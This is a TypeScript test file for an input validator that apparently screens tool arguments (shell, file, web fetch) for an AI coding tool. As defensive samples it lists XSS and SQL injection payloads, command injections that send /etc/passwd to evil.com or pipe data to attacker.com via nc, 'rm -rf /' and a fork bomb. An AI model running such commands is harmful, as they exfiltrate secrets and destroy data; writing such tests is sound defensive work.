/**
 * @license
 * Copyright 2025 CodeDuet
 * SPDX-License-Identifier: Apache-2.0
 */

import { describe, it, expect, beforeEach } from 'vitest';
import { InputValidator, ValidationLimits, ValidationContext } from './inputValidator.js';

describe('InputValidator', () => {
  let validator: InputValidator;
  let context: ValidationContext;

  beforeEach(() => {
    validator = new InputValidator();
    context = {
      toolName: 'test_tool',
      parameterName: 'test_param',
      sessionId: 'test-session-123',
    };
  });

  describe('String validation', () => {
    it('should validate normal strings', () => {
      const result = validator.validateInput('Hello, world!', {}, context);
      expect(result.isValid).toBe(true);
      expect(result.sanitizedValue).toBe('Hello, world!');
    });

    it('should reject strings exceeding length limit', () => {
      const longString = 'a'.repeat(100001);
      const result = validator.validateInput(longString, {}, context);
      expect(result.isValid).toBe(false);
      expect(result.error).toContain('exceeds maximum allowed');
      expect(result.securityRisk).toBe('high');
    });

    it('should respect custom length limits', () => {
      const customLimits: Partial<ValidationLimits> = { maxStringLength: 10 };
      const result = validator.validateInput('This is too long', customLimits, context);
      expect(result.isValid).toBe(false);
      expect(result.error).toContain('exceeds maximum allowed');
    });

    it('should detect script injection patterns', () => {
      const maliciousStrings = [
        '<script>alert("xss")</script>',
        'javascript:alert("xss")',
        'onload=alert("xss")',
        '<img src=x onerror=alert("xss")>',
      ];

      maliciousStrings.forEach(str => {
        const result = validator.validateInput(str, {}, context);
        expect(result.isValid).toBe(false);
        expect(result.securityRisk).toBe('critical');
        expect(result.error).toContain('blocked pattern');
      });
    });

    it('should detect SQL injection patterns', () => {
      const sqlInjections = [
        "'; DROP TABLE users; --",
        "1' UNION SELECT * FROM users WHERE '1'='1",
        "admin' OR '1'='1' --",
        "INSERT INTO users VALUES ('hacker', 'password')",
      ];

      sqlInjections.forEach(str => {
        const result = validator.validateInput(str, {}, context);
        expect(result.isValid).toBe(false);
        expect(result.securityRisk).toBe('critical');
      });
    });

    it('should detect command injection patterns', () => {
      const commandInjections = [
        'ls; rm -rf /',
        'cat /etc/passwd | mail hacker@evil.com',
        'echo $(whoami)',
        'test && curl evil.com',
        'input | nc attacker.com 1234',
      ];

      commandInjections.forEach(str => {
        const result = validator.validateInput(str, {}, context);
        expect(result.isValid).toBe(false);
        expect(result.securityRisk).toBe('critical');
      });
    });

    it('should sanitize strings by removing control characters', () => {
      const stringWithControlChars = 'Hello\x00World\x01Test\x7F';
      const result = validator.validateInput(stringWithControlChars, {}, context);
      expect(result.isValid).toBe(true);
      expect(result.sanitizedValue).toBe('HelloWorldTest');
      expect(result.securityRisk).toBe('low');
    });

    it('should normalize excessive whitespace', () => {
      const stringWithWhitespace = 'Hello     world\t\t\ttest';
      const result = validator.validateInput(stringWithWhitespace, {}, context);
      expect(result.isValid).toBe(true);
      expect(result.sanitizedValue).toBe('Hello world test');
    });

    it('should reject strings with excessive whitespace (DoS protection)', () => {
      const dosString = 'a' + ' '.repeat(1001) + 'b';
      const result = validator.validateInput(dosString, {}, context);
      expect(result.isValid).toBe(false);
      expect(result.securityRisk).toBe('high');
    });

    it('should validate against allowed patterns', () => {
      const limits: Partial<ValidationLimits> = {
        allowedPatterns: [/^[a-zA-Z0-9]+$/],
      };
      
      const validResult = validator.validateInput('abc123', limits, context);
      expect(validResult.isValid).toBe(true);

      const invalidResult = validator.validateInput('abc123!', limits, context);
      expect(invalidResult.isValid).toBe(false);
      expect(invalidResult.securityRisk).toBe('medium');
    });
  });

  describe('Number validation', () => {
    it('should validate normal numbers', () => {
      const result = validator.validateInput(42, {}, context);
      expect(result.isValid).toBe(true);
      expect(result.sanitizedValue).toBe(42);
    });

    it('should reject NaN', () => {
      const result = validator.validateInput(NaN, {}, context);
      expect(result.isValid).toBe(false);
      expect(result.error).toBe('Number must be finite');
      expect(result.securityRisk).toBe('medium');
    });

    it('should reject Infinity', () => {
      const result = validator.validateInput(Infinity, {}, context);
      expect(result.isValid).toBe(false);
      expect(result.error).toBe('Number must be finite');
    });

    it('should respect number range limits', () => {
      const limits: Partial<ValidationLimits> = {
        minNumberValue: 0,
        maxNumberValue: 100,
      };

      const validResult = validator.validateInput(50, limits, context);
      expect(validResult.isValid).toBe(true);

      const tooLargeResult = validator.validateInput(101, limits, context);
      expect(tooLargeResult.isValid).toBe(false);
      expect(tooLargeResult.securityRisk).toBe('high');

      const tooSmallResult = validator.validateInput(-1, limits, context);
      expect(tooSmallResult.isValid).toBe(false);
    });
  });

  describe('Array validation', () => {
    it('should validate arrays within size limits', () => {
      const testArray = [1, 2, 3, 'test'];
      const result = validator.validateInput(testArray, {}, context);
      expect(result.isValid).toBe(true);
      expect(Array.isArray(result.sanitizedValue)).toBe(true);
    });

    it('should reject arrays exceeding length limit', () => {
      const largeArray = new Array(1001).fill('item');
      const result = validator.validateInput(largeArray, {}, context);
      expect(result.isValid).toBe(false);
      expect(result.error).toContain('Array length');
      expect(result.securityRisk).toBe('high');
    });

    it('should validate array elements', () => {
      const arrayWithMalicious = ['normal', '<script>alert("xss")</script>'];
      const result = validator.validateInput(arrayWithMalicious, {}, context);
      expect(result.isValid).toBe(false);
      expect(result.error).toContain('Array element at index 1');
      expect(result.securityRisk).toBe('critical');
    });

    it('should sanitize array elements', () => {
      const arrayToSanitize = ['Hello\x00World', 'Normal text'];
      const result = validator.validateInput(arrayToSanitize, {}, context);
      expect(result.isValid).toBe(true);
      expect(result.sanitizedValue).toEqual(['HelloWorld', 'Normal text']);
    });
  });

  describe('Object validation', () => {
    it('should validate normal objects', () => {
      const testObject = { name: 'test', value: 42, enabled: true };
      const result = validator.validateInput(testObject, {}, context);
      expect(result.isValid).toBe(true);
      expect(typeof result.sanitizedValue).toBe('object');
    });

    it('should reject deeply nested objects', () => {
      const deepObject = { level1: { level2: { level3: { level4: { level5: { level6: { level7: { level8: { level9: { level10: { level11: 'too deep' } } } } } } } } } } };
      const result = validator.validateInput(deepObject, {}, context);
      expect(result.isValid).toBe(false);
      expect(result.error).toContain('nesting depth');
      expect(result.securityRisk).toBe('high');
    });

    it('should validate object keys', () => {
      const objectWithMaliciousKey = { 'normal_key': 'value', '<script>alert("xss")</script>': 'malicious' };
      const result = validator.validateInput(objectWithMaliciousKey, {}, context);
      expect(result.isValid).toBe(false);
      expect(result.error).toContain('Object key');
      expect(result.securityRisk).toBe('critical');
    });

    it('should validate object values', () => {
      const objectWithMaliciousValue = { key: '<script>alert("xss")</script>' };
      const result = validator.validateInput(objectWithMaliciousValue, {}, context);
      expect(result.isValid).toBe(false);
      expect(result.error).toContain('Object property');
    });
  });

  describe('URL validation', () => {
    it('should validate HTTP/HTTPS URLs', () => {
      const validUrls = [
        'http://example.com',
        'https://example.com/path',
        'https://sub.example.com:8080/path?query=value',
      ];

      validUrls.forEach(url => {
        const result = validator.validateUrl(url, undefined, undefined, context);
        expect(result.isValid).toBe(true);
        expect(result.sanitizedValue).toBe(url);
      });
    });

    it('should reject invalid URL schemes', () => {
      const invalidUrls = [
        'javascript:alert("xss")',
        'data:text/html,<script>alert("xss")</script>',
        'file:///etc/passwd',
        'ftp://example.com',
      ];

      invalidUrls.forEach(url => {
        const result = validator.validateUrl(url, undefined, undefined, context);
        expect(result.isValid).toBe(false);
        expect(result.securityRisk).toBe('high');
      });
    });

    it('should respect allowed domains', () => {
      const allowedDomains = ['example.com', 'trusted.org'];
      
      const validResult = validator.validateUrl('https://example.com/path', undefined, allowedDomains, context);
      expect(validResult.isValid).toBe(true);

      const invalidResult = validator.validateUrl('https://evil.com/path', undefined, allowedDomains, context);
      expect(invalidResult.isValid).toBe(false);
      expect(invalidResult.securityRisk).toBe('medium');
    });

    it('should detect suspicious URL patterns', () => {
      const suspiciousUrls = [
        'https://example.com/path<script>',
        'https://user@password@example.com',
        'https://example.com/path"onclick=alert()',
      ];

      suspiciousUrls.forEach(url => {
        const result = validator.validateUrl(url, undefined, undefined, context);
        expect(result.isValid).toBe(false);
        expect(result.securityRisk).toBe('high');
      });
    });
  });

  describe('File content validation', () => {
    it('should validate normal text content', () => {
      const content = 'This is normal file content.';
      const result = validator.validateFileContent(content, 'text/plain', {}, context);
      expect(result.isValid).toBe(true);
      expect(result.sanitizedValue).toBe(content);
    });

    it('should reject oversized content', () => {
      const largeContent = 'a'.repeat(51 * 1024 * 1024); // 51MB
      const result = validator.validateFileContent(largeContent, 'text/plain', {}, context);
      expect(result.isValid).toBe(false);
      expect(result.error).toContain('File size');
      expect(result.securityRisk).toBe('high');
    });

    it('should reject disallowed MIME types', () => {
      const content = 'suspicious content';
      const result = validator.validateFileContent(content, 'application/x-executable', {}, context);
      expect(result.isValid).toBe(false);
      expect(result.error).toContain('MIME type');
      expect(result.securityRisk).toBe('medium');
    });

    it('should validate Buffer content', () => {
      const buffer = Buffer.from('binary content');
      const result = validator.validateFileContent(buffer, 'image/png', {}, context);
      expect(result.isValid).toBe(true);
      expect(Buffer.isBuffer(result.sanitizedValue)).toBe(true);
    });
  });

  describe('Tool-specific limits', () => {
    it('should create appropriate limits for write_file tool', () => {
      const limits = InputValidator.createToolLimits('write_file');
      expect(limits.maxStringLength).toBe(10 * 1024 * 1024); // 10MB
      expect(limits.maxFileSize).toBe(50 * 1024 * 1024); // 50MB
    });

    it('should create appropriate limits for shell tool', () => {
      const limits = InputValidator.createToolLimits('shell');
      expect(limits.maxStringLength).toBe(10000);
      expect(limits.blockedPatterns).toBeDefined();
      expect(limits.blockedPatterns!.length).toBeGreaterThan(0);
    });

    it('should create appropriate limits for web_fetch tool', () => {
      const limits = InputValidator.createToolLimits('web_fetch');
      expect(limits.maxStringLength).toBe(10000);
      expect(limits.allowedPatterns).toBeDefined();
      expect(limits.allowedPatterns!.length).toBeGreaterThan(0);
    });

    it('should block dangerous shell patterns', () => {
      const limits = InputValidator.createToolLimits('shell');
      const dangerousCommands = [
        'rm -rf /',
        'while true; do echo bomb; done',
        'for((;;)); do echo bomb; done',
        ':(){ :|: & };:',  // Fork bomb
      ];

      dangerousCommands.forEach(cmd => {
        const result = validator.validateInput(cmd, limits, {
          ...context,
          toolName: 'shell',
        });
        expect(result.isValid).toBe(false);
        expect(result.securityRisk).toBe('critical');
      });
    });
  });

  describe('Edge cases', () => {
    it('should handle null and undefined values', () => {
      const nullResult = validator.validateInput(null, {}, context);
      expect(nullResult.isValid).toBe(true);
      expect(nullResult.sanitizedValue).toBe(null);

      const undefinedResult = validator.validateInput(undefined, {}, context);
      expect(undefinedResult.isValid).toBe(true);
      expect(undefinedResult.sanitizedValue).toBe(undefined);
    });

    it('should handle unsupported types', () => {
      const symbolResult = validator.validateInput(Symbol('test'), {}, context);
      expect(symbolResult.isValid).toBe(false);
      expect(symbolResult.error).toContain('Unsupported input type');
      expect(symbolResult.securityRisk).toBe('medium');
    });

    it('should handle validation errors gracefully', () => {
      // Test with circular reference that would cause JSON.stringify to fail
      const circular: any = { self: null };
      circular.self = circular;
      
      const result = validator.validateInput(circular, {}, context);
      expect(result.isValid).toBe(false);
    });
  });

  describe('Security risk assessment', () => {
    it('should assign appropriate risk levels', () => {
      const testCases = [
        { input: '<script>alert()</script>', expectedRisk: 'critical' },
        { input: 'SELECT * FROM users', expectedRisk: 'critical' },
        { input: 'a'.repeat(100001), expectedRisk: 'high' },
        { input: Symbol('test'), expectedRisk: 'medium' },
        { input: 'normal text', expectedRisk: undefined },
      ];

      testCases.forEach(({ input, expectedRisk }) => {
        const result = validator.validateInput(input, {}, context);
        if (expectedRisk) {
          expect(result.securityRisk).toBe(expectedRisk);
        } else {
          expect(result.securityRisk).toBeUndefined();
        }
      });
    });
  });
});